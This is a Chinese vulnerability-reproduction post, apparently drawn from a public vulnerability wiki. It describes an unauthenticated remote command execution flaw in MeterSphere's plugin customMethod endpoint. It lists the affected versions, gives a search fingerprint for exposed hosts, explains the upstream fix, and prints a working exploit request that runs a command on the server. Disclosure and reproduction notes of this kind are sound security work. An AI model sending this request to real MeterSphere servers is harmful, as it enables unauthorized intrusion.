---
title: "MeterSphere customMethod 远程命令执行漏洞"
date: 2026-10-16 09:08:45
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "MeterSphere-customMethod"
tags:
  - "MeterSphere-customMethod"
  - "命令执行"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

2022年1月5日，知道创宇404积极防御实验团队发现了MeterSphere开源持续测试平台的一处漏洞，并向MeterSphere研发团队进行了反馈。通过该漏洞攻击者可以在未授权的情况下执行远程代码，建议MeterSphere平台用户，尤其是可通过公网访问的用户尽快进行升级修复。

## 漏洞影响

```
MeterSphere v1.13.0 - v1.16.3
```

## 网络测绘

```
body="MeterSphere"
```

## 漏洞复现

登陆页面

![image-20230424163040952](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230424163040952.png)

根据官方的修复可以看到目前版本的修复版本为删除代码片段

filterChainDefinitionMap.put("/plugin/**", "anon");

```
https://github.com/metersphere/metersphere/pull/9140/files
```

![image-20230424163652968](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230424163652968.png)

查看文件 /backend/src/main/java/io/metersphere/controller/PluginController.java

![image-20230424163710253](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230424163710253.png)

发送请求包

```
POST /plugin/customMethod

{"entry":"Evil","request":"id"}
```

![image-20230424163729245](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230424163729245.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/MeterSphere-customMethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
